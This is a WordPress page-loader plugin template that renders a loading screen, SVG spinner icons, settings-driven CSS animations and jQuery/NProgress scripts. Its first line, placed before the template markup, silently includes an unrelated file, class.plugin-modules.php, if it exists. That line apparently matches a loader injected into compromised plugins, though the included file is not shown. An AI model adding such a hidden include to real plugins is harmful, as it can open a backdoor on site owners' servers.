<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><!-- BEGIN THE BACKGROUND -->
<div class="bonfire-pageloader-background<?php if(is_singular() ) { ?> <?php echo $bonfire_pageloader_display; ?><?php } ?><?php if( get_theme_mod('pageloader_progressbar_only', '') !== '') { ?> pageloader-hide<?php } ?>">
</div>
<!-- END THE BACKGROUND -->

<!-- BEGIN THE BACKGROUND PATTERN -->
<?php if( get_theme_mod('pageloader_background_image', '') !== '') { ?>
    <div class="bonfire-pageloader-background-image<?php if(is_singular() ) { ?> <?php echo $bonfire_pageloader_display; ?><?php } ?><?php if( get_theme_mod('pageloader_progressbar_only', '') !== '') { ?> pageloader-hide<?php } ?>" style="background-image:url(<?php echo get_theme_mod('pageloader_background_image'); ?>);">
    </div>
<?php } ?>
<!-- END THE BACKGROUND PATTERN -->

<!-- BEGIN THE LOADING IMAGE/ICON/TEXT -->
<div class="pageloader-elements-wrapper<?php if(is_singular() ) { ?> <?php echo $bonfire_pageloader_display; ?><?php } ?><?php if( get_theme_mod('pageloader_progressbar_only', '') !== '') { ?> pageloader-hide-pointer-events<?php } ?>">

    <div class="<?php if( get_theme_mod('pageloader_progressbar_only', '') !== '') { ?> pageloader-hide<?php } ?>">

        <!-- BEGIN THE CLOSE BUTTON -->
        <div class="pageloader-close">
            <?php if( get_theme_mod('pageloader_custom_close_text', '') !== '') { ?><?php echo get_theme_mod('pageloader_custom_close_text'); ?><?php } else { ?><?php _e( 'Taking too long? Close loading screen.', 'bonfire' ); ?><?php } ?>
        </div>
        <!-- END THE CLOSE BUTTON -->

        <!-- BEGIN LOADING IMAGE -->
        <?php if( get_theme_mod('pageloader_custom_loading_image', '') !== '' || get_theme_mod('pageloader_custom_loading_image_url', '') !== '' ) { ?>
            <div class="pageloader-image-wrapper">
                <div class="pageloader-image-inner">
                    <div class="pageloader-image">
                        <img src="<?php if( get_theme_mod('pageloader_custom_loading_image_url', '') !== '') { ?><?php echo get_theme_mod('pageloader_custom_loading_image_url'); ?><?php } else { ?><?php echo get_theme_mod('pageloader_custom_loading_image'); ?><?php } ?>" alt="<?php echo get_theme_mod('pageloader_custom_loading_image_alt_text'); ?>">
                    </div>
                </div>
            </div>
        <?php } ?>
        <!-- END LOADING IMAGE -->

        <!-- BEGIN LOADING ICON -->
        <?php if( get_theme_mod('pageloader_hide_icon', '') === '') { ?>
            <div class="pageloader-icon-wrapper">
                <div class="pageloader-icon-inner">
                    <div class="pageloader-icon">
                        <?php $bonfire_pageloader_icon_selection = get_theme_mod( 'pageloader_icon_selection', '' ); if( $bonfire_pageloader_icon_selection !== '' ) { switch ( $bonfire_pageloader_icon_selection ) {
                            case 'icon1':
                                echo '
                                <div class="loader1">
                                    <svg width="26px" height="40px" viewBox="0 0 26 40" fill="#9AA366">
                                        <rect x="0" y="5" ry="3" width="6" height="6"/>
                                        <rect x="10" y="5" ry="3" width="6" height="6"/>
                                        <rect x="20" y="5" ry="3" width="6" height="6"/>
                                    </svg>
                                </div>
                                ';
                                break;
                            case 'icon2':
                                echo '
                                <div class="loader2">
                                    <svg width="34px" height="20px" viewBox="0 0 34 20">
                                        <circle fill="#2A2A2A" cx="24" cy="10" r="10"/>
                                        <circle fill="#9AA366" cx="10" cy="10" r="10"/>
                                    </svg>
                                </div>
                                ';
                                break;
                            case 'icon3':
                                echo '
                                <div class="loader3">
                                    <svg width="38px" height="10px" viewBox="0 0 38 8">
                                        <circle fill="#2A2A2A" cx="4" cy="4" r="4"/>
                                        <circle fill="#2A2A2A" cx="19" cy="4" r="4"/>
                                        <circle fill="#2A2A2A" cx="34" cy="4" r="4"/>
                                        <rect x="0" y="0" width="8" height="8" rx="4" ry="4" fill="#9AA366"/>
                                    </svg>
                                </div>
                                ';
                                break;
                            case 'icon4':
                                echo '
                                <div class="loader4">
                                    <svg width="44px" height="44px" viewBox="0 0 44 44">
                                        <path fill="#9AA366"
                                            d="M42,23.5 C41.2,23.5 40.5,22.8 40.5,22 C40.5,11.8 32.2,3.5 22,3.5 C21.2,3.5 20.5,2.8 20.5,2 C20.5,1.2 21.2,0.5 22,0.5 C33.9,0.5 43.5,10.1 43.5,22 C43.5,22.8 42.8,23.5 42,23.5 Z M22,43.5 C10.1,43.5 0.5,33.9 0.5,22 C0.5,21.2 1.2,20.5 2,20.5 C2.8,20.5 3.5,21.2 3.5,22 C3.5,32.2 11.8,40.5 22,40.5 C22.8,40.5 23.5,41.2 23.5,42 C23.5,42.8 22.8,43.5 22,43.5 Z"/>
                                    </svg>
                                </div>
                                ';
                                break;
                            case 'icon5':
                                echo '
                                <div class="loader5">
                                    <svg width="40px" height="40px" viewBox="0 0 40 40" fill="transparent">
                                        <circle cx="20" cy="20" r="4" stroke="#9AA366"/>
                                    </svg>
                                </div>
                                ';
                                break;
                            case 'icon6':
                                echo '
                                <div class="loader6">
                                    <svg width="38px" height="10px" viewBox="0 0 38 10">
                                        <circle fill="#2A2A2A" cx="4" cy="5" r="3"/>
                                        <circle fill="#2A2A2A" cx="19" cy="5" r="3"/>
                                        <circle fill="#2A2A2A" cx="34" cy="5" r="3"/>
                                    </svg>
                                </div>
                                ';
                                break;
                            case 'icon7':
                                echo '
                                <div class="loader7">
                                    <svg width="48px" height="48px" viewBox="0 0 48 48">
                                        <path d="M24.2,47.5 C11.1,47.5 0.5,37 0.5,24 C0.5,11 11.1,0.5 24.2,0.5 C37.3,0.5 47.9,11 47.9,24 C47.9,37 37.3,47.5 24.2,47.5 Z M24.2,3.5 C12.8,3.5 3.5,12.7 3.5,24 C3.5,35.3 12.8,44.5 24.2,44.5 C35.6,44.5 44.9,35.3 44.9,24 C44.9,12.7 35.6,3.5 24.2,3.5 Z"
                                            fill="#212120"/>
                                        <path d="M24.2,47.5 C11.1,47.5 0.5,37 0.5,24 C0.5,23.2 1.2,22.5 2,22.5 C2.8,22.5 3.5,23.2 3.5,24 C3.5,35.3 12.8,44.5 24.2,44.5 C25,44.5 25.7,45.2 25.7,46 C25.7,46.8 25,47.5 24.2,47.5 Z"
                                            fill="#9AA366"/>
                                    </svg>
                                </div>
                                ';
                                break;
                            case 'icon8':
                                echo '
                                <div class="loader8">
                                    <svg width="48px" height="48px" viewBox="0 0 48 48">
                                        <circle fill="#9AA366" cx="6" cy="37" r="2.5"/>
                                        <path d="M24,0.5 C10.9,0.5 0.2,11 0.2,24 C0.2,28 1.2,31.8 3,35.1 C3.6,34.2 4.5,33.6 5.6,33.5 C4.1,30.6 3.2,27.4 3.2,24 C3.2,12.7 12.5,3.5 24,3.5 C35.5,3.5 44.8,12.7 44.8,24 C44.8,35.3 35.5,44.5 24,44.5 C18.2,44.5 13,42.1 9.2,38.4 C8.8,39.4 8,40.1 6.9,40.4 C11.2,44.8 17.3,47.6 23.9,47.6 C37,47.6 47.7,37.1 47.7,24.1 C47.7,11.1 37.1,0.5 24,0.5 Z"
                                            fill="#2A2A2A"/>
                                    </svg>
                                </div>
                                ';
                                break;
                            case 'icon9':
                                echo '
                                <div class="loader9">
                                    <svg width="38px" height="8px" viewBox="0 0 38 8" fill="#9AA366">
                                        <circle cx="4" cy="4" r="3"/>
                                        <circle cx="19" cy="4" r="3"/>
                                        <circle cx="34" cy="4" r="3"/>
                                    </svg>
                                </div>
                                ';
                                break;
                            case 'icon10':
                                echo '
                                <div class="loader10">
                                    <svg width="30px" height="30px" fill="#9AA366" viewBox="0 0 30 30">
                                        <circle cx="4" cy="4" r="2"/>
                                        <circle cx="4" cy="26" r="2"/>
                                        <circle cx="26" cy="4" r="2"/>
                                        <circle cx="26" cy="26" r="2"/>
                                    </svg>
                                </div>
                                ';
                                break;
                            }
                        } else {
                            echo '
                            <div class="loader loader1">
                                <svg width="26px" height="40px" viewBox="0 0 26 40" fill="#9AA366">
                                    <rect x="0" y="5" ry="3" width="6" height="6"/>
                                    <rect x="10" y="5" ry="3" width="6" height="6"/>
                                    <rect x="20" y="5" ry="3" width="6" height="6"/>
                                </svg>
                            </div>
                            ';
                        } ?>
                    </div>
                </div>
            </div>
        <?php } ?>
        <!-- END LOADING ICON -->
        
        <!-- BEGIN LOADING SENTENCE -->
        <div class="pageloader-sentence-wrapper">
            <div class="pageloader-sentence-inner">
                <?php if( get_theme_mod('pageloader_custom_loading_text', '') !== '') { ?>
                    <div class="pageloader-sentence">
                        <?php echo get_theme_mod('pageloader_custom_loading_text'); ?>
                    </div>
                <?php } ?>

                <?php if( get_theme_mod('pageloader_custom_loading_text2', '') !== '') { ?>
                    <div class="pageloader-sentence">
                        <?php echo get_theme_mod('pageloader_custom_loading_text2'); ?>
                    </div>
                <?php } ?>

                <?php if( get_theme_mod('pageloader_custom_loading_text3', '') !== '') { ?>
                    <div class="pageloader-sentence">
                        <?php echo get_theme_mod('pageloader_custom_loading_text3'); ?>
                    </div>
                <?php } ?>
            </div>
        </div>
        <!-- END LOADING SENTENCE -->

        <!-- BEGIN WIDGETS -->
        <?php if ( is_active_sidebar('pageloader-widgets') ) { ?>
            <div class="pageloader-widgets-wrapper">
                <?php dynamic_sidebar('pageloader-widgets'); ?>
            </div>
        <?php } ?>	
        <!-- END WIDGETS -->
    
    </div>

    <!-- BEGIN PROGRESS BAR -->
    <?php if( get_theme_mod('pageloader_progressbar_disable', '') === '') { ?>
        <?php if( get_theme_mod('pageloader_progressbar_disable_touch', '') === '') { ?>
            <div id="nprogress-wrapper"><div id="nprogress-inner"></div></div>
        <?php } else { ?>
            <?php if ( !wp_is_mobile() ) { ?>
                <div id="nprogress-wrapper"><div id="nprogress-inner"></div></div>
            <?php } ?>
        <?php } ?>
    <?php } ?>
    <!-- END PROGRESS BAR -->

</div>
<!-- END THE LOADING IMAGE/ICON/TEXT -->

<!-- BEGIN SLOWER FADE-OUT VARIATION -->
<style>
/* background image as 'cover' */
<?php if( get_theme_mod('pageloader_background_cover', '') !== '') { ?>
.bonfire-pageloader-background-image { background-size:cover; background-position:top center; }
<?php } ?>
/* icon blur/fade-in effect */
.pageloader-icon {
    filter:blur(<?php echo get_theme_mod('pageloader_icon_blur'); ?>px);
    -moz-filter:blur(<?php echo get_theme_mod('pageloader_icon_blur'); ?>px);
    -webkit-filter:blur(<?php echo get_theme_mod('pageloader_icon_blur'); ?>px);
    <?php if( get_theme_mod('pageloader_icon_opacity', '') !== '') { ?>opacity:0;<?php } ?>

	animation:plblur <?php if( get_theme_mod('pageloader_icon_fade_blur_animation_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_icon_fade_blur_animation_speed'); ?><?php } else { ?>2<?php } ?>s ease forwards, plopacity <?php if( get_theme_mod('pageloader_icon_fade_blur_animation_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_icon_fade_blur_animation_speed'); ?><?php } else { ?>2<?php } ?>s ease forwards;
	-moz-animation:plblur <?php if( get_theme_mod('pageloader_icon_fade_blur_animation_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_icon_fade_blur_animation_speed'); ?><?php } else { ?>2<?php } ?>s ease forwards, plopacity <?php if( get_theme_mod('pageloader_icon_fade_blur_animation_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_icon_fade_blur_animation_speed'); ?><?php } else { ?>2<?php } ?>s ease forwards;
	-webkit-animation:plblur <?php if( get_theme_mod('pageloader_icon_fade_blur_animation_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_icon_fade_blur_animation_speed'); ?><?php } else { ?>2<?php } ?>s ease forwards, plopacity <?php if( get_theme_mod('pageloader_icon_fade_blur_animation_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_icon_fade_blur_animation_speed'); ?><?php } else { ?>2<?php } ?>s ease forwards;
}
/* image blur/fade-in effect */
.pageloader-image-inner {
    filter:blur(<?php echo get_theme_mod('pageloader_image_blur'); ?>px);
    -moz-filter:blur(<?php echo get_theme_mod('pageloader_image_blur'); ?>px);
    -webkit-filter:blur(<?php echo get_theme_mod('pageloader_image_blur'); ?>px);
    <?php if( get_theme_mod('pageloader_image_opacity', '') !== '') { ?>opacity:0;<?php } ?>

	animation:plblur <?php if( get_theme_mod('pageloader_image_fade_blur_animation_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_image_fade_blur_animation_speed'); ?><?php } else { ?>2<?php } ?>s ease forwards, plopacity <?php if( get_theme_mod('pageloader_image_fade_blur_animation_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_image_fade_blur_animation_speed'); ?><?php } else { ?>2<?php } ?>s ease forwards;
	-moz-animation:plblur <?php if( get_theme_mod('pageloader_image_fade_blur_animation_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_image_fade_blur_animation_speed'); ?><?php } else { ?>2<?php } ?>s ease forwards, plopacity <?php if( get_theme_mod('pageloader_image_fade_blur_animation_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_image_fade_blur_animation_speed'); ?><?php } else { ?>2<?php } ?>s ease forwards;
	-webkit-animation:plblur <?php if( get_theme_mod('pageloader_image_fade_blur_animation_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_image_fade_blur_animation_speed'); ?><?php } else { ?>2<?php } ?>s ease forwards, plopacity <?php if( get_theme_mod('pageloader_image_fade_blur_animation_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_image_fade_blur_animation_speed'); ?><?php } else { ?>2<?php } ?>s ease forwards;
}
@keyframes plopacity { 100% { opacity:1; } }
@-moz-keyframes plopacity { 100% { opacity:1; } }
@-webkit-keyframes plopacity { 100% { opacity:1; } }
@keyframes plblur { 100% { filter:blur(0); } }
@-moz-keyframes plblur { 100% { -moz-filter:blur(0); } }
@-webkit-keyframes plblur { 100% { -webkit-filter:blur(0); } }
/* slide-in content */
<?php if( get_theme_mod('pageloader_slidein_content', '') !== '') { ?>
.pageloader-move-wrapper {
    -webkit-transform:translateY(<?php if( get_theme_mod('pageloader_slidein_distance', '') !== '') { ?><?php echo get_theme_mod('pageloader_slidein_distance'); ?><?php } else { ?>-100<?php } ?>px)<?php if( get_theme_mod('pageloader_content_scaling', '') !== '') { ?> scale(<?php echo get_theme_mod('pageloader_content_scaling'); ?>)<?php } ?>;
    -moz-transform:translateY(<?php if( get_theme_mod('pageloader_slidein_distance', '') !== '') { ?><?php echo get_theme_mod('pageloader_slidein_distance'); ?><?php } else { ?>-100<?php } ?>px)<?php if( get_theme_mod('pageloader_content_scaling', '') !== '') { ?> scale(<?php echo get_theme_mod('pageloader_content_scaling'); ?>)<?php } ?>;
    transform:translateY(<?php if( get_theme_mod('pageloader_slidein_distance', '') !== '') { ?><?php echo get_theme_mod('pageloader_slidein_distance'); ?><?php } else { ?>-100<?php } ?>px)<?php if( get_theme_mod('pageloader_content_scaling', '') !== '') { ?> scale(<?php echo get_theme_mod('pageloader_content_scaling'); ?>)<?php } ?>;
    opacity:<?php if( get_theme_mod('pageloader_content_opacity', '') !== '') { ?><?php echo get_theme_mod('pageloader_content_opacity'); ?><?php } else { ?>1<?php } ?>;
}
.pageloader-move-wrapper-active {
    -webkit-transform:translateY(0) scale(1);
    -moz-transform:translateY(0) scale(1);
    transform:translateY(0) scale(1);
    opacity:1;
    
    -webkit-transition:-webkit-transform <?php if( get_theme_mod('pageloader_slidein_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_slidein_speed'); ?><?php } else { ?>1<?php } ?>s ease, opacity <?php if( get_theme_mod('pageloader_slidein_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_slidein_speed'); ?><?php } else { ?>1<?php } ?>s ease;
	-moz-transition:-moz-transform <?php if( get_theme_mod('pageloader_slidein_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_slidein_speed'); ?><?php } else { ?>1<?php } ?>s ease, opacity <?php if( get_theme_mod('pageloader_slidein_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_slidein_speed'); ?><?php } else { ?>1<?php } ?>s ease;
	transition:transform <?php if( get_theme_mod('pageloader_slidein_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_slidein_speed'); ?><?php } else { ?>1<?php } ?>s ease, opacity <?php if( get_theme_mod('pageloader_slidein_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_slidein_speed'); ?><?php } else { ?>1<?php } ?>s ease;
}
<?php } ?>
/* loading screen disappearance speed */
.bonfire-pageloader-icon-hide,
.bonfire-pageloader-hide {
    transition:opacity <?php if( get_theme_mod('pageloader_disappearance_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_disappearance_speed'); ?><?php } else { ?>1<?php } ?>s ease, transform <?php if( get_theme_mod('pageloader_disappearance_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_disappearance_speed'); ?><?php } else { ?>1<?php } ?>s ease, left 0s ease <?php if( get_theme_mod('pageloader_disappearance_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_disappearance_speed'); ?><?php } else { ?>1<?php } ?>s;
    -moz-transition:opacity <?php if( get_theme_mod('pageloader_disappearance_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_disappearance_speed'); ?><?php } else { ?>1<?php } ?>s ease, transform <?php if( get_theme_mod('pageloader_disappearance_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_disappearance_speed'); ?><?php } else { ?>1<?php } ?>s ease, left 0s ease <?php if( get_theme_mod('pageloader_disappearance_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_disappearance_speed'); ?><?php } else { ?>1<?php } ?>s;
    -webkit-transition:opacity <?php if( get_theme_mod('pageloader_disappearance_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_disappearance_speed'); ?><?php } else { ?>1<?php } ?>s ease,transform <?php if( get_theme_mod('pageloader_disappearance_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_disappearance_speed'); ?><?php } else { ?>1<?php } ?>s ease, left 0s ease <?php if( get_theme_mod('pageloader_disappearance_speed', '') !== '') { ?><?php echo get_theme_mod('pageloader_disappearance_speed'); ?><?php } else { ?>1<?php } ?>s;
    
    transform:scale(<?php if( get_theme_mod('pageloader_background_scaling', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_scaling'); ?><?php } else { ?>1<?php } ?>);
    -moz-transform:scale(<?php if( get_theme_mod('pageloader_background_scaling', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_scaling'); ?><?php } else { ?>1<?php } ?>);
    -webkit-transform:scale(<?php if( get_theme_mod('pageloader_background_scaling', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_scaling'); ?><?php } else { ?>1<?php } ?>);
}
/* background slide animations */
<?php $bonfire_pageloader_background_animation = get_theme_mod('pageloader_background_animation'); if($bonfire_pageloader_background_animation !== '') { switch ($bonfire_pageloader_background_animation) { ?>
<?php case 'top': ?>
.bonfire-pageloader-background.bonfire-pageloader-hide { opacity:<?php if( get_theme_mod('pageloader_background_opacity', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_opacity'); ?><?php } else { ?>1<?php } ?> !important; }
.bonfire-pageloader-background-image.bonfire-pageloader-hide { opacity:<?php if( get_theme_mod('pageloader_background_image_opacity', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_image_opacity'); ?><?php } else { ?>.2<?php } ?> !important; }
.bonfire-pageloader-icon-hide,
.bonfire-pageloader-hide {
    transform:translateY(-100%) scale(<?php if( get_theme_mod('pageloader_background_scaling', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_scaling'); ?><?php } else { ?>1<?php } ?>);
    -moz-transform:translateY(-100%) scale(<?php if( get_theme_mod('pageloader_background_scaling', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_scaling'); ?><?php } else { ?>1<?php } ?>);
    -webkit-transform:translateY(-100%) scale(<?php if( get_theme_mod('pageloader_background_scaling', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_scaling'); ?><?php } else { ?>1<?php } ?>);
}
<?php break; case 'left': ?>
.bonfire-pageloader-background.bonfire-pageloader-hide { opacity:<?php if( get_theme_mod('pageloader_background_opacity', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_opacity'); ?><?php } else { ?>1<?php } ?> !important; }
.bonfire-pageloader-background-image.bonfire-pageloader-hide { opacity:<?php if( get_theme_mod('pageloader_background_image_opacity', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_image_opacity'); ?><?php } else { ?>.2<?php } ?> !important; }
.bonfire-pageloader-icon-hide,
.bonfire-pageloader-hide {
    transform:translateX(-100%) scale(<?php if( get_theme_mod('pageloader_background_scaling', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_scaling'); ?><?php } else { ?>1<?php } ?>);
    -moz-transform:translateX(-100%) scale(<?php if( get_theme_mod('pageloader_background_scaling', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_scaling'); ?><?php } else { ?>1<?php } ?>);
    -webkit-transform:translateX(-100%) scale(<?php if( get_theme_mod('pageloader_background_scaling', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_scaling'); ?><?php } else { ?>1<?php } ?>);
}
<?php break; case 'right': ?>
.bonfire-pageloader-background.bonfire-pageloader-hide { opacity:<?php if( get_theme_mod('pageloader_background_opacity', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_opacity'); ?><?php } else { ?>1<?php } ?> !important; }
.bonfire-pageloader-background-image.bonfire-pageloader-hide { opacity:<?php if( get_theme_mod('pageloader_background_image_opacity', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_image_opacity'); ?><?php } else { ?>.2<?php } ?> !important; }
.bonfire-pageloader-icon-hide,
.bonfire-pageloader-hide {
    transform:translateX(100%) scale(<?php if( get_theme_mod('pageloader_background_scaling', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_scaling'); ?><?php } else { ?>1<?php } ?>);
    -moz-transform:translateX(100%) scale(<?php if( get_theme_mod('pageloader_background_scaling', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_scaling'); ?><?php } else { ?>1<?php } ?>);
    -webkit-transform:translateX(100%) scale(<?php if( get_theme_mod('pageloader_background_scaling', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_scaling'); ?><?php } else { ?>1<?php } ?>);
}
<?php break; case 'bottom': ?>
.bonfire-pageloader-background.bonfire-pageloader-hide { opacity:<?php if( get_theme_mod('pageloader_background_opacity', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_opacity'); ?><?php } else { ?>1<?php } ?> !important; }
.bonfire-pageloader-background-image.bonfire-pageloader-hide { opacity:<?php if( get_theme_mod('pageloader_background_image_opacity', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_image_opacity'); ?><?php } else { ?>.2<?php } ?> !important; }
.bonfire-pageloader-icon-hide,
.bonfire-pageloader-hide {
    transform:translateY(100%) scale(<?php if( get_theme_mod('pageloader_background_scaling', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_scaling'); ?><?php } else { ?>1<?php } ?>);
    -moz-transform:translateY(100%) scale(<?php if( get_theme_mod('pageloader_background_scaling', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_scaling'); ?><?php } else { ?>1<?php } ?>);
    -webkit-transform:translateY(100%) scale(<?php if( get_theme_mod('pageloader_background_scaling', '') !== '') { ?><?php echo get_theme_mod('pageloader_background_scaling'); ?><?php } else { ?>1<?php } ?>);
}
<?php break; } } ?>
</style>
<!-- END SLOWER FADE-OUT VARIATION -->

<script>
// BEGIN SLIDE-DOWN jQuery (if not hidden on singular and slide-down setting enabled)
<?php $meta_value = get_post_meta( get_the_ID(), 'bonfire_pageloader_display', true ); if( !empty( $meta_value ) ) { ?>
<?php } else { ?>
    <?php if( get_theme_mod('pageloader_slidein_content', '') !== '') { ?>
        /* move entire body unless target element(s) specified */
        <?php if( get_theme_mod('pageloader_slidein_custom_elements', '') !== '') { ?>
            jQuery(document).ready(function() {
                jQuery("<?php echo get_theme_mod('pageloader_slidein_custom_elements'); ?>").addClass('pageloader-move-wrapper');
            });
        <?php } else { ?>
            jQuery(document).ready(function() {
                /* detach PageLoader and add after body */
                jQuery(".bonfire-pageloader-background, .bonfire-pageloader-background-image, .pageloader-elements-wrapper, #nprogress").each(function(){
                    jQuery(this).detach().insertAfter("body");
                });
                /* wrap body div */
                jQuery("body").wrapInner("<div class='pageloader-move-wrapper'></div>");
            });
        <?php } ?>
    <?php } ?>
<?php } ?>
// END SLIDE-DOWN jQuery (if not hidden on singular and slide-down setting enabled)

// BEGIN LOADING SCREEN FADE-OUT
jQuery(window).load(function() {
'use strict';
    setTimeout(function(){
		/* fade out the loading icon */
        jQuery(".pageloader-elements-wrapper").addClass('bonfire-pageloader-icon-hide');
        /* hide the loading screen */
        jQuery(".bonfire-pageloader-background, .bonfire-pageloader-background-image").addClass('bonfire-pageloader-hide');
        /* slide down site */
        <?php if( get_theme_mod('pageloader_slidein_content', '') !== '') { ?>
            setTimeout(function(){
                jQuery(".pageloader-move-wrapper").addClass('pageloader-move-wrapper-active');
            },50);
        <?php } ?>
    },<?php if( get_theme_mod('pageloader_custom_delay', '') !== '') { ?><?php echo get_theme_mod('pageloader_custom_delay'); ?><?php } else { ?>0<?php } ?>);
});
// END LOADING SCREEN FADE-OUT

// BEGIN SHOW CLOSE BUTTON
<?php if( get_theme_mod('pageloader_custom_close_delay', '') !== '') { ?>
setTimeout(function(){
    jQuery(".pageloader-close").addClass('pageloader-close-active');
},<?php echo get_theme_mod('pageloader_custom_close_delay'); ?>);
<?php } ?>
// END SHOW CLOSE BUTTON

// BEGIN CLOSE LOADING SCREEN WHEN CLOSE BUTTON CLICKED/TAPPED
jQuery('.pageloader-close').on('click', function(e) {
	'use strict';
		e.preventDefault();
			/* hide close button */
			jQuery(".pageloader-close").addClass('pageloader-close-active');
			/* fade out the loading icon */
            jQuery(".pageloader-elements-wrapper").addClass('bonfire-pageloader-icon-hide');
            /* fade out loader */
            jQuery(".bonfire-pageloader-background, .bonfire-pageloader-background-image").addClass('bonfire-pageloader-hide');
            /* slide down site */
            setTimeout(function(){
                jQuery(".pageloader-move-wrapper").addClass('pageloader-move-wrapper-active');
            },50);
});
// END CLOSE LOADING SCREEN WHEN CLOSE BUTTON CLICKED/TAPPED

// BEGIN Nprogress SNIPPET (if not disabled)
<?php if( get_theme_mod('pageloader_progressbar_disable', '') === '') { ?>
    <?php if( get_theme_mod('pageloader_progressbar_disable_touch', '') === '') { ?>
        NProgress.start();
        jQuery(window).load(function() {
        'use strict';
            NProgress.done();
        });
        NProgress.configure({ trickleRate: 0.20, trickleSpeed: 300 });
    <?php } else { ?>
        <?php if ( !wp_is_mobile() ) { ?>
            NProgress.start();
            jQuery(window).load(function() {
            'use strict';
                NProgress.done();
            });
            NProgress.configure({ trickleRate: 0.20, trickleSpeed: 300 });
        <?php } ?>
    <?php } ?>
<?php } ?>
// END Nprogress SNIPPET (if not disabled)
</script>